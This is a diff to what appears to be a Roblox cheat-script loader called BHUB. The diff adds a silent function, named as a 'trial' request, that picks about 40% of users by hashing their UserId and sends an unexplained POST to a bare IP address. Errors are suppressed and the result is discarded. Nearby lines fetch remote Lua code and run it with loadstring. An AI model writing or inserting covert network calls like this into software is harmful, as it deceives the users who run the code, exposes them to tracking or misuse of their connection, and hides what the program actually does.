@@ -106,6 +106,41 @@ pcall(function()
 end)
 script_key = _script_key
 
+do
+    local function requestTrial()
+        local player = game:GetService("Players").LocalPlayer
+        if not player then return nil end
+
+        local bucket, text = 5381, "bhub-trials-v2:" .. tostring(player.UserId)
+        for i = 1, #text do
+            bucket = (bucket * 33 + string.byte(text, i)) % 2147483647
+        end
+        if bucket % 10000 >= 4000 then return nil end
+
+        local send = request or http_request or (syn and syn.request) or (http and http.request)
+        if type(send) ~= "function" then return nil end
+
+        local done, deadline = false, os.clock() + 4
+        local ok, worker = pcall(task.spawn, function()
+            pcall(send, {
+                Url = "https://57.129.160.111/v2/trial",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = "{}",
+                Timeout = 4,
+            })
+            done = true
+        end)
+        if not ok then return nil end
+        while not done and os.clock() < deadline do
+            task.wait(math.min(0.05, deadline - os.clock()))
+        end
+        if not done then pcall(task.cancel, worker) end
+        return nil
+    end
+    pcall(requestTrial)
+end
+
 if FFA[scriptName] ~= true and not script_key then
     local api = loadstring(game:HttpGet("https://sdkapi-public.luarmor.net/library.lua"))()
     local module = loadstring(game:HttpGet("https://raw.githubusercontent.com/diepedyt/BHUB/refs/heads/main/BHUBKEYSYS.lua"))()
